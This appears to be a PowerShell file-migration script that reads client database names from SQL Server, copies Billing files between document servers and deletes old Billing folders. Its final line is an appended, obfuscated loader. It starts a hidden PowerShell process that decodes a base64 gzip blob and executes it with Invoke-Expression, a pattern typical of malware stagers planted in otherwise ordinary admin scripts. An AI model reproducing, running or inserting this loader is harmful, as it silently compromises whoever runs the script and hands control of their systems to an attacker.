


[CmdletBinding()]
param()


cls

[array]$Clients = @();
[array]$Clients = Invoke-SQLCMD -ServerInstance XUTILSQL2 -Database DexmaSites -Query "SELECT DISTINCT dv.dv_value AS DocServer
      , [ce].[DatabaseName]
      , [ce].[DatabaseServer]
FROM    [DexmaSites].dbo.[clients] AS c
		JOIN dexmaSites.dbo.client_data_xref cdx
		ON cdx.[cl_id] = c.[cl_id]
        JOIN dexmaSites.dbo.data_values dv
        ON cdx.dv_id = dv.dv_id
        JOIN dexmaSites.dbo.ClientEnvironment AS ce
        ON ce.[ClientID] = cdx.[cl_id]
WHERE   dv.di_id = 96
        AND [ce].[EnvironmentID] = 13
ORDER BY [ce].[DatabaseName]"

foreach ( $Client in $Clients ) {

Write-Host "Beginning $($Client.DatabaseName)" -ForegroundColor DarkGray

	if (($Client.DocServer -eq "PADoc5") -or ($Client.DocServer -eq "PDocDirect10"))
		{
		Write-Verbose -Message "$($Client.DatabaseName) on $($Client.DocServer) has not been migrated to the new datacenter.";
		}
	else
		{
	Write-Verbose -Message "Beginning $($Client.DatabaseName)";
		
		[array]$CopyFrom = @();
		
		if (Test-Path -Path "\\PDocDirect10\$($Client.DatabaseName)")
			{
			Write-Verbose -Message "`t\\PDocDirect10\$($Client.DatabaseName) found, enumerating files(source).";
			$CopyFrom += @(Get-ChildItem -path "\\PDocDirect10\$($Client.DatabaseName)\Billing\*" ) 
			}
		if (Test-Path -Path "\\PADoc5\$($Client.DatabaseName)")
			{
			Write-Verbose -Message "`t\\PADoc5\$($Client.DatabaseName) folder found, enumerating files(source).";
			$CopyFrom += @(Get-ChildItem -path "\\PADoc5\$($Client.DatabaseName)\Billing\*");
			}
		
		$DestPath = "\\" + $Client.DocServer + "\" + $Client.DatabaseName + "\Billing";
		[array]$CopyTo = @();
		
		if (!(Test-Path -Path $DestPath))
			{
				Write-Verbose -Message "`t$($DestPath) not found!  Creating directory...";
				New-Item -ItemType directory -Path $DestPath;
				if (!(Test-Path -Path $DestPath))
					{
						Write-Verbose -Message "Failed creating $($DestPath)...";
						continue;
					}
				else
					{
					Write-Verbose -Message "`t$($DestPath) created, enumerating files(dest).";
					$CopyTo += @(Get-ChildItem -path "$DestPath\*");
					}
			}
		else
			{
			Write-Verbose -Message "`t$($DestPath) found, enumerating files(dest).";
			$CopyTo += @(Get-ChildItem -path "$DestPath\*");
			}
		
		Write-Verbose -Message "`tComparing directory contents...";
		
		$Files2Copy = Compare-Object -ReferenceObject $CopyFrom -DifferenceObject $CopyTo -Property name, length -PassThru | Where-Object {$_.SideIndicator -eq "<="};

		if ($Files2Copy -ne $NULL)
			{
			foreach ($File in $Files2Copy)
		        {
		        Write-Verbose -Message "`tThis will copy File $($File.FullName) to $DestPath\$($File.Name)";
		        Copy-Item -Path $($File.FullName) -Destination $DestPath\$($File.Name) 
		        }
			}
		else
		    {
		    Write-Verbose -Message "`tNo files to copy for $($Client.DatabaseName)!";
		    }

		if ($Client.DocServer -eq "PDoc1")
			{
				$DropPath = "\\PDoc2\Relateprod\PrimeAlliance\" + $Client.DatabaseName + "\Billing";
			}
		else
			{
				$DropPath = "\\PDoc1\Relateprod\PrimeAlliance\" + $Client.DatabaseName + "\Billing";
			}
		if (Test-Path -Path $DropPath)
			{
				Write-Verbose -Message "`tDropping the $($DropPath) folder!";
				Remove-Item -Recurse -Path $DropPath 
			}
		else
		{
			Write-Verbose -Message "`tNo files to delete for $($Client.DatabaseName)!";
		}
	Write-Verbose -Message "End $($Client.DatabaseName)";
		}
		
Write-Host "End $($Client.DatabaseName)" -ForegroundColor DarkGray
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIANLUNlgCA7VWa2/aShD9nEr9D1aFZFslGAhtmkiV7trmFR6BOJgQiqKNvbYXFi+xl/Bo+9/vGOyUqEmV6upaidj1zOyePXNmx94ydATlobQIGk5P+v7+3VEPR3guKbl1q3eXl3LC2kQ3A4OsrtSjIzDngi/FO+/eYYN6vSZ9lZQxWixMPsc0nJyfG8soIqHYzwt1IlAck/k9oyRWVOmHNAxIRI4v76fEEdJ3KXdXqDN+j1nqtjGwExDpGIVuYmtzByfoCtaCUaHI377J6vi4NClUH5aYxYpsbWJB5gWXMVmVfqrJhtebBVHkDnUiHnNPFIY0PCkXBmGMPdKF1R5Jh4iAu7GswmngLyJiGYXSs3MlC+3dFBmGvYg7yHUjEkNUoRk+8hlRcuGSsbz0jzJOUVwtQ0HnBOyCRHxhkeiROiQuNHDoMnJFvInSJavs8G8NUg6DwKsnIjUP6fkD3A53l4zsV5DV3wHvUqvC8zy9wMfP9+/ev/MyTbiVu2L8qbs9lAWMjsa7MQHASo/HdOf7VSrmpQ5siQWPNjDNXUdLok6kcZKQ8WQi5bZlsX6Y4cYg8Gf519cpZUEQwuNr0o1X8HZsc+pOICrNWm51b1dnNESJ7XUFmsSjITE3IZ5TJxOZ8lIeiMfI7tiFzK0L2BQ5NRDXJIz4WCSM5qXx72HVORVPsfqSMpdEyIFcxoAK0qw+B7NPkiI3ww6ZA2X7uQwp8UDaJPNO5bzJdk/m4CQbDMdxXuotobacvGQRzIibl1AY09SEloLvhvIvuJ0lE9TBsciWm6iHXKZ7GjyMRbR0IJNw/mtrQRyKWUJHXmpQl+gbi/rZ3vKLZBiYMRr6sNIjJAPeJCRYItFHBDCfaUEtWEQ05wtG5uC7K/gawz6Ud1ocO2Fhn7jyS2gz4e9VnnCTkXKAFRJuMS7ykk0jAXdHwnMqrv+G5uACecJlRCTNlJLV1FjfiKQKchxtWvPRwkhkm9K2IykSQFAt4nMdx+RzxRIR0Kd80C6pgeAZNUPWcfQZLaEVLTU78D+gJ01unrqti2lDi8x14KFm3Ow0ema/0ag8Xlh2RVjVpmj1mqJTvZlOLdS4GozEbRM1rmlxNqpsFxd0a7WRO1prn7f6dlXU19up73oj0/P8U8+6Kn2q0fbQ6OvFMm6b1WV7qK/0YiWu0lWjTwf92UVN3I9shgee5t+UzjBdt6OpXeKdbROhenDibC88ux503M2ooZ0NKzNURcgIq3ZN562RHqGeZmPf5qvWVPPrvoH0mkPJbX9Q0/v9mo4G9emDeab5EHuDA31ol+nt4uYqgHkNILS0YqXpki0f9YGkOkfYvwIf3yg7gQc+5kekf+zyuIxnOkc6+NRuHwDXaFHrMbBfD8oc2ax7g1H7dlPTtNKoV0GNIh3WfZQsiX29j1H8aG5NrWS73B1+6o48zb5hp5ppXC8cT9O0VcNsObel9ZfL0y/tIbXnHA00zf6Q6AMEknPPVp/1u4OMv3bpd3AUB5iBEuAWz0q0xqNaeiP3OE0iFGXfrWckCgmD7gb9LxM2Yow7SYN4uryhQe3bxgQqdQDDk/KLI1V6clR/NY3s1fn5LUBNqiYVcKFNQl8E+eL6pFiEu7+4rhThwG8/osEXG+VpuXzSP1KmDndhu13UpIZyj0b5fyYxrdwAfty3kPjr3R+sbyK2mM8O/5vh+Yu/4vjvGRhiKsDVgtuHkX2LfJ2IVDgHnxiQIlCElz7JF9/lUhx34cPjXxzhFCJqCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

